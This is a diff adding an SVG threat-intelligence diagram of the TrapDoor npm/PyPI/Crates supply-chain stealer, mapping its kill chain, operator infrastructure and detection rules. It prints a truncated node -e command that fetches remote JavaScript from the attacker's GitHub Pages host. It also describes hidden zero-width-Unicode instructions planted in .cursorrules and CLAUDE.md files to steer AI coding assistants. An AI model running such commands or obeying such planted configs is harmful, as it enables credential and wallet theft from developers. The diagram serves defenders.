@@ -1,0 +1,275 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1280" role="img" aria-labelledby="t d">
+  <title id="t">TrapDoor cross-ecosystem supply chain kill chain</title>
+  <desc id="d">Two-lane vertical layout. Left lane is the victim developer workstation with seven numbered stages: package install from npm, PyPI or Crates; ecosystem-specific trigger (postinstall, import, build.rs); node -e remote evaluation; AI assistant configuration plant with zero-width Unicode; six-surface persistence (cursorrules, CLAUDE.md, Git hooks, shell hooks, systemd, cron, SSH authorized_keys); credential sweep and validation; exfiltration to GitHub Pages and Gists. Right lane is the TrapDoor operator infrastructure with six boxes: operator persona ddjidd564 with lure repositories; multi-registry publishing waves; shared trap-core.js payload; ddjidd564.github.io configuration and AUDIT-MATRIX playbook; PR-bombing campaign against AI coding projects; exfil destinations and campaign marker. Critical stages are tinted red. Cross-lane arrows mark package ingress, payload pull, PR injection direction, and exfil egress. Footer maps every Sigma, KQL, YARA, Suricata file and PEAK hunt to its anchor.</desc>
+  <defs>
+    <style><![CDATA[
+      .bg { fill: #ffffff; }
+      .head { font-family: sans-serif; font-size: 18px; font-weight: 700; fill: #0a0a0a; }
+      .meta { font-family: sans-serif; font-size: 11px; fill: #404040; }
+      .laneL { fill: #f3f7fb; stroke: #5a7da6; stroke-width: 1.2; }
+      .laneR { fill: #faf3ee; stroke: #b07a3a; stroke-width: 1.2; }
+      .laneLabel { font-family: sans-serif; font-size: 12px; font-weight: 700; fill: #2a4a6a; }
+      .laneLabelR { font-family: sans-serif; font-size: 12px; font-weight: 700; fill: #8a5520; }
+      .stage { fill: #ffffff; stroke: #5a7da6; stroke-width: 1.1; }
+      .stageK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+      .op { fill: #ffffff; stroke: #b07a3a; stroke-width: 1.1; }
+      .opK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+      .badge { fill: #5a7da6; stroke: none; }
+      .badgeK { fill: #b03030; stroke: none; }
+      .badgeR { fill: #b07a3a; stroke: none; }
+      .badgeText { font-family: sans-serif; font-size: 12px; font-weight: 700; fill: #ffffff; text-anchor: middle; }
+      .label { font-family: sans-serif; font-size: 13px; font-weight: 700; fill: #0a0a0a; }
+      .sub { font-family: sans-serif; font-size: 11px; fill: #303030; }
+      .mono { font-family: ui-monospace, "SFMono-Regular", Consolas, monospace; font-size: 10.5px; fill: #303030; }
+      .footer { fill: #f6f6f4; stroke: #888; stroke-width: 1; }
+      .footerH { font-family: sans-serif; font-size: 12px; font-weight: 700; fill: #1a1a1a; }
+      .footerT { font-family: sans-serif; font-size: 10.5px; fill: #1a1a1a; }
+      .arrow { stroke: #2a4a6a; stroke-width: 1.6; fill: none; }
+      .arrowX { stroke: #7a3a7a; stroke-width: 1.6; fill: none; stroke-dasharray: 5 3; }
+      .arrowR { stroke: #8a5520; stroke-width: 1.6; fill: none; }
+
+      @media (prefers-color-scheme: dark) {
+        .bg { fill: #0d1117; }
+        .head { fill: #f0f0f0; }
+        .meta { fill: #c0c0c0; }
+        .laneL { fill: #182230; stroke: #7aa6d0; }
+        .laneR { fill: #2a2418; stroke: #d09a5a; }
+        .laneLabel { fill: #a8c6e2; }
+        .laneLabelR { fill: #e2bf8a; }
+        .stage { fill: #1c2530; stroke: #7aa6d0; }
+        .stageK { fill: #3a1818; stroke: #e06060; }
+        .op { fill: #2a2418; stroke: #d09a5a; }
+        .opK { fill: #3a1818; stroke: #e06060; }
+        .badge { fill: #7aa6d0; }
+        .badgeK { fill: #e06060; }
+        .badgeR { fill: #d09a5a; }
+        .badgeText { fill: #0d1117; }
+        .label { fill: #f0f0f0; }
+        .sub { fill: #c8c8c8; }
+        .mono { fill: #c0d0e0; }
+        .footer { fill: #1a1d22; stroke: #555; }
+        .footerH { fill: #f0f0f0; }
+        .footerT { fill: #d0d0d0; }
+        .arrow { stroke: #a8c6e2; }
+        .arrowX { stroke: #c898d0; }
+        .arrowR { stroke: #e2bf8a; }
+      }
+    
+.acc-ransomware { fill: #b03030; }
+.acc-espionage { fill: #2a4a6a; }
+.acc-supply-chain { fill: #b07a3a; }
+.acc-identity-cloud { fill: #6a4ca6; }
+.acc-ot-ics { fill: #2f8f4e; }
+.acc-edge-network { fill: #1d7a8c; }
+.acc-mobile { fill: #c2569a; }
+.acc-crypto-defi { fill: #d08a1f; }
+.acc-malware-re { fill: #556070; }
+.acc-other { fill: #6a6a6a; }
+.accLabel { font: 700 11px sans-serif; fill: #ffffff; }
+]]></style>
+    <marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+      <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
+    </marker>
+  </defs>
+
+  <rect class="bg" x="0" y="0" width="880" height="1280"/>
+  <rect class="acc-crypto-defi" x="0" y="0" width="880" height="8"/>
+
+  <!-- Header (10..70) -->
+  <rect x="10" y="10" width="860" height="60" fill="none" stroke="none"/>
+  <text class="head" x="20" y="36">TrapDoor — Cross-Ecosystem Crypto and AI-Developer Stealer (npm, PyPI, Crates.io)</text>
+  <text class="meta" x="20" y="58">Vendor: Socket Research Team (2026-05-24)  ·  First seen: 2026-05-22 20:20 UTC  ·  Cluster: TrapDoor (Socket-tracked, persona ddjidd564)  ·  Day 31 / 2026-05-28</text>
+
+  <!-- Left lane (85..1165) -->
+  <rect class="laneL" x="20" y="85" width="410" height="1080" rx="6"/>
+  <text class="laneLabel" x="32" y="105">VICTIM  ·  Developer workstation / build agent / CI runner</text>
+
+  <!-- Stage 1: package install -->
+  <rect class="stage" x="30" y="120" width="395" height="135" rx="5"/>
+  <circle class="badge" cx="50" cy="140" r="14"/>
+  <text class="badgeText" x="50" y="144">1</text>
+  <text class="label" x="72" y="144">Developer installs lookalike package</text>
+  <text class="sub" x="40" y="168">npm i prompt-engineering-toolkit  ·  pip install eth-security-auditor</text>
+  <text class="sub" x="40" y="184">cargo add sui-move-build-helper &amp;&amp; cargo build</text>
+  <text class="sub" x="40" y="204">Targets crypto, DeFi, Solana, Sui, Move and AI-tooling devs.</text>
+  <text class="mono" x="40" y="226">MITRE: T1195.002  ·  21 npm + 7 PyPI + 6 Crates packages</text>
+  <text class="mono" x="40" y="244">IOC: eth-security-auditor@0.1.0 (first seen 2026-05-22)</text>
+
+  <!-- Stage 2: ecosystem trigger (critical) -->
+  <rect class="stageK" x="30" y="270" width="395" height="135" rx="5"/>
+  <circle class="badgeK" cx="50" cy="290" r="14"/>
+  <text class="badgeText" x="50" y="294">2</text>
+  <text class="label" x="72" y="294">Ecosystem trigger: postinstall / import / build.rs</text>
+  <text class="sub" x="40" y="318">npm: package.json postinstall hook fires after install</text>
+  <text class="sub" x="40" y="334">PyPI: __init__.py runs at import time (auto-execute)</text>
+  <text class="sub" x="40" y="350">Crates: build.rs runs at every cargo build (pre-runtime)</text>
+  <text class="mono" x="40" y="376">MITRE: T1059.007 (Node) , T1059.006 (Python)</text>
+  <text class="mono" x="40" y="394">All three ecosystems share infrastructure + marker P-2024-001</text>
+
+  <!-- Stage 3: node -e remote eval -->
+  <rect class="stage" x="30" y="420" width="395" height="135" rx="5"/>
+  <circle class="badge" cx="50" cy="440" r="14"/>
+  <text class="badgeText" x="50" y="444">3</text>
+  <text class="label" x="72" y="444">node -e evaluates remote JavaScript</text>
+  <text class="sub" x="40" y="468">PyPI variant spawns node with -e flag from python parent</text>
+  <text class="sub" x="40" y="484">Payload fetched from attacker GitHub Pages, eval'd in-process</text>
+  <text class="mono" x="40" y="510">node -e "https.get('https://ddjidd564.github.io/...')..."</text>
+  <text class="mono" x="40" y="528">MITRE: T1059.007  ·  T1102 Web Service</text>
+  <text class="mono" x="40" y="546">Anchor: node -e + python parent or npm postinstall parent</text>
+
+  <!-- Stage 4: AI config plant (critical) -->
+  <rect class="stageK" x="30" y="570" width="395" height="135" rx="5"/>
+  <circle class="badgeK" cx="50" cy="590" r="14"/>
+  <text class="badgeText" x="50" y="594">4</text>
+  <text class="label" x="72" y="594">AI assistant config plant with zero-width Unicode</text>
+  <text class="sub" x="40" y="618">.cursorrules and CLAUDE.md written into project roots</text>
+  <text class="sub" x="40" y="634">Hidden text via U+200B / U+200C / U+200D / U+FEFF</text>
+  <text class="sub" x="40" y="650">AI assistant runs fake "security scan" on next session</text>
+  <text class="mono" x="40" y="676">MITRE: T1027.013  ·  T1554 Compromise Host Binary</text>
+  <text class="mono" x="40" y="694">Discriminator: package-manager process writes the file</text>
+
+  <!-- Stage 5: six-surface persistence -->
+  <rect class="stage" x="30" y="720" width="395" height="135" rx="5"/>
+  <circle class="badge" cx="50" cy="740" r="14"/>
+  <text class="badgeText" x="50" y="744">5</text>
+  <text class="label" x="72" y="744">Six-surface persistence stack</text>
+  <text class="sub" x="40" y="768">Git hooks (.git/hooks/pre-push)  ·  shell hooks (.bashrc/.zshrc)</text>
+  <text class="sub" x="40" y="784">systemd user units  ·  crontab  ·  SSH authorized_keys</text>
+  <text class="sub" x="40" y="800">.cursorrules and CLAUDE.md (stage 4) make six surfaces total</text>
+  <text class="mono" x="40" y="826">MITRE: T1546 / T1547.013 / T1037 / T1053.003 / T1098.004</text>
+  <text class="mono" x="40" y="844">Any one surface re-bootstraps the implant.</text>
+
+  <!-- Stage 6: credential sweep -->
+  <rect class="stage" x="30" y="870" width="395" height="135" rx="5"/>
+  <circle class="badge" cx="50" cy="890" r="14"/>
+  <text class="badgeText" x="50" y="894">6</text>
+  <text class="label" x="72" y="894">Credential sweep + in-line validation</text>
+  <text class="sub" x="40" y="918">SSH keys  ·  AWS / GitHub / npm / cargo / pypi tokens</text>
+  <text class="sub" x="40" y="934">Browser login DBs  ·  Sui / Solana / Aptos / MetaMask wallets</text>
+  <text class="sub" x="40" y="950">Validates AWS via sts.amazonaws.com, GH via api.github.com/user</text>
+  <text class="mono" x="40" y="976">MITRE: T1552.001/.004/.005  ·  T1555.003  ·  T1539</text>
+  <text class="mono" x="40" y="994">Fernet + ECDH encrypt harvested set on host</text>
+
+  <!-- Stage 7: exfil (critical) -->
+  <rect class="stageK" x="30" y="1020" width="395" height="135" rx="5"/>
+  <circle class="badgeK" cx="50" cy="1040" r="14"/>
+  <text class="badgeText" x="50" y="1044">7</text>
+  <text class="label" x="72" y="1044">Exfiltration to GitHub Gists and Pages</text>
+  <text class="sub" x="40" y="1068">Crates build.rs XOR(cargo-build-helper-2026) -&gt; gist.gh.com</text>
+  <text class="sub" x="40" y="1084">npm trap-core.js -&gt; configurable endpoint via GH Pages config</text>
+  <text class="sub" x="40" y="1100">PyPI -&gt; whatever remote JS chooses server-side</text>
+  <text class="mono" x="40" y="1126">MITRE: T1567.001  ·  T1041 Exfil over C2 Channel</text>
+  <text class="mono" x="40" y="1144">Detection latency baseline: Socket median 5m27s</text>
+
+  <!-- Right lane (85..1165) -->
+  <rect class="laneR" x="450" y="85" width="410" height="1080" rx="6"/>
+  <text class="laneLabelR" x="462" y="105">OPERATOR  ·  TrapDoor infrastructure and PR campaign</text>
+
+  <!-- Box A: persona + lure repos -->
+  <rect class="op" x="460" y="125" width="395" height="155" rx="5"/>
+  <circle class="badgeR" cx="480" cy="145" r="14"/>
+  <text class="badgeText" x="480" y="149">A</text>
+  <text class="label" x="502" y="149">Operator persona  ·  ddjidd564</text>
+  <text class="sub" x="470" y="173">GitHub account hosting payloads, PRs and lure repos</text>
+  <text class="sub" x="470" y="189">npm publisher: asdxzxc</text>
+  <text class="sub" x="470" y="205">PyPI publishers: asdmini67 , dae5411</text>
+  <text class="sub" x="470" y="221">Lure repos: env-security-scanner , smart-contract-audit-toolkit</text>
+  <text class="sub" x="470" y="237">defi-profit-scanner , web3-dev-toolkit-2026 , solidity-gas-optimizer</text>
+  <text class="mono" x="470" y="261">Campaign marker: P-2024-001</text>
+
+  <!-- Box B: multi-registry publishing waves -->
+  <rect class="op" x="460" y="295" width="395" height="155" rx="5"/>
+  <circle class="badgeR" cx="480" cy="315" r="14"/>
+  <text class="badgeText" x="480" y="319">B</text>
+  <text class="label" x="502" y="319">Multi-registry publishing waves</text>
+  <text class="sub" x="470" y="343">npm (21): prompt-engineering-toolkit , wallet-security-checker</text>
+  <text class="sub" x="470" y="359">solidity-deploy-guard , dev-env-bootstrapper , model-switch-router</text>
+  <text class="sub" x="470" y="375">PyPI (7): eth-security-auditor , defi-risk-scanner , env-loader-cli</text>
+  <text class="sub" x="470" y="391">Crates.io (6): sui-move-build-helper , move-analyzer-build</text>
+  <text class="sub" x="470" y="407">34 packages  ·  384+ versions  ·  uploaded in distinct waves</text>
+  <text class="mono" x="470" y="431">First seen 2026-05-22 20:20:18 UTC (PyPI)</text>
+
+  <!-- Box C: trap-core.js payload (critical) -->
+  <rect class="opK" x="460" y="465" width="395" height="155" rx="5"/>
+  <circle class="badgeK" cx="480" cy="485" r="14"/>
+  <text class="badgeText" x="480" y="489">C</text>
+  <text class="label" x="502" y="489">trap-core.js  ·  1149-line npm payload</text>
+  <text class="sub" x="470" y="513">Credential harvester + propagation tool (size ~48485 bytes)</text>
+  <text class="sub" x="470" y="529">Fernet symmetric + ECDH key agreement; validates AWS/GH live</text>
+  <text class="sub" x="470" y="545">Writes the six persistence surfaces enumerated in left stage 5</text>
+  <text class="sub" x="470" y="561">SSH-based lateral movement via stolen keys to neighbor hosts</text>
+  <text class="mono" x="470" y="585">YARA: trapdoor_npm_trap_core_js heuristic anchor set</text>
+  <text class="mono" x="470" y="603">Crates variant: XOR key 'cargo-build-helper-2026'</text>
+
+  <!-- Box D: ddjidd564.github.io + AUDIT-MATRIX -->
+  <rect class="op" x="460" y="635" width="395" height="155" rx="5"/>
+  <circle class="badgeR" cx="480" cy="655" r="14"/>
+  <text class="badgeText" x="480" y="659">D</text>
+  <text class="label" x="502" y="659">ddjidd564.github.io  ·  config + playbook</text>
+  <text class="sub" x="470" y="683">GitHub Pages host serving config.json + remote JS payload</text>
+  <text class="sub" x="470" y="699">gh-pages branch hosts AUDIT-MATRIX.md (extraction framework)</text>
+  <text class="sub" x="470" y="715">BYPASS.md , PAYLOAD.md , SWARM.md (operator design docs)</text>
+  <text class="sub" x="470" y="731">"Universal AI Agent Extraction Framework" — partial impl</text>
+  <text class="mono" x="470" y="755">/defi-security-best-practices/config.json</text>
+  <text class="mono" x="470" y="773">Suricata sids: 8260001-8260006 anchor DNS/TLS/HTTP</text>
+
+  <!-- Box E: PR-bombing AI projects -->
+  <rect class="op" x="460" y="805" width="395" height="155" rx="5"/>
+  <circle class="badgeR" cx="480" cy="825" r="14"/>
+  <text class="badgeText" x="480" y="829">E</text>
+  <text class="label" x="502" y="829">PR campaign against AI / dev projects</text>
+  <text class="sub" x="470" y="853">Poisoned .cursorrules / CLAUDE.md PRs against:</text>
+  <text class="mono" x="470" y="873">browser-use/browser-use , langchain-ai/langchain</text>
+  <text class="mono" x="470" y="891">langflow-ai/langflow , run-llama/llama_index</text>
+  <text class="mono" x="470" y="909">FoundationAgents/MetaGPT , OpenHands/OpenHands</text>
+  <text class="sub" x="470" y="931">PR bodies cite marker P-2024-001 + standards/dev-guidance lures</text>
+  <text class="sub" x="470" y="947">GitHub flagged hidden bidirectional Unicode on one PR.</text>
+
+  <!-- Box F: exfil destinations + campaign marker -->
+  <rect class="op" x="460" y="975" width="395" height="155" rx="5"/>
+  <circle class="badgeR" cx="480" cy="995" r="14"/>
+  <text class="badgeText" x="480" y="999">F</text>
+  <text class="label" x="502" y="999">Exfil destinations + cross-ecosystem ties</text>
+  <text class="sub" x="470" y="1023">Crates -&gt; gist.githubusercontent.com (XOR + reqwest UA)</text>
+  <text class="sub" x="470" y="1039">npm -&gt; configurable endpoint resolved from config.json</text>
+  <text class="sub" x="470" y="1055">PyPI -&gt; delegated to remote JS loaded by node -e</text>
+  <text class="sub" x="470" y="1071">Cross-eco bridge: same marker, same persona, same config host</text>
+  <text class="mono" x="470" y="1095">Socket reported all 34 packages to registries</text>
+  <text class="mono" x="470" y="1113">Detection latency: median 5m27s , fastest 58s</text>
+
+  <!-- Cross-lane arrows -->
+  <!-- Stage 1 -> Box B (registry pull): -->
+  <g color="#7a3a7a">
+    <path class="arrowX" d="M 425 187 C 440 187 445 372 460 372" marker-end="url(#ah)"/>
+  </g>
+  <!-- Stage 3 -> Box C (payload pull): -->
+  <g color="#7a3a7a">
+    <path class="arrowX" d="M 425 487 C 440 487 445 542 460 542" marker-end="url(#ah)"/>
+  </g>
+  <!-- Box E -> Stage 4 (PR injection direction, reverse): -->
+  <g color="#7a3a7a">
+    <path class="arrowX" d="M 460 882 C 445 882 440 637 425 637" marker-end="url(#ah)"/>
+  </g>
+  <!-- Stage 7 -> Box F (exfil egress): -->
+  <g color="#7a3a7a">
+    <path class="arrowX" d="M 425 1087 C 440 1087 445 1052 460 1052" marker-end="url(#ah)"/>
+  </g>
+
+  <!-- Vertical flow arrows inside left lane (between consecutive stages) -->
+  <g color="#2a4a6a">
+    <path class="arrow" d="M 227 255 L 227 270" marker-end="url(#ah)"/>
+    <path class="arrow" d="M 227 405 L 227 420" marker-end="url(#ah)"/>
+    <path class="arrow" d="M 227 555 L 227 570" marker-end="url(#ah)"/>
+    <path class="arrow" d="M 227 705 L 227 720" marker-end="url(#ah)"/>
+    <path class="arrow" d="M 227 855 L 227 870" marker-end="url(#ah)"/>
+    <path class="arrow" d="M 227 1005 L 227 1020" marker-end="url(#ah)"/>
+  </g>
+
+  <!-- Footer: detection anchors (1175..1270) -->
+  <rect class="footer" x="20" y="1175" width="840" height="95" rx="4"/>
+  <text class="footerH" x="32" y="1195">Detection anchors  (see ./sigma , ./kql , ./yara , ./suricata , ./hunts)</text>
+  <text class="footerT" x="32" y="1213">Sigma×3: 01 node -e from pkg-mgr parent  ·  02 .cursorrules/CLAUDE.md write by pkg-mgr  ·  03 egress to ddjidd564.github.io</text>
+  <text class="footerT" x="32" y="1228">KQL×3:   k1 DeviceProcessEvents node -e fleet sweep (7d)  ·  k2 DeviceFileEvents AI-config writes (14d)  ·  k3 DeviceNetworkEvents egress correlation (14d)</text>
+  <text class="footerT" x="32" y="1243">YARA×1 (4 rules): trap-core.js heuristic , PyPI node -e to attacker host , Crates build.rs XOR , .cursorrules/CLAUDE.md zero-width Unicode</text>
+  <text class="footerT" x="32" y="1258">Suricata×1 (6 sids 8260001-8260006): DNS , TLS SNI , HTTP host , URI /defi-security-best-practices/ , reqwest UA to Gists , marker P-2024-001  ·  PEAK hunts H1/H2/H3</text>
+</svg>
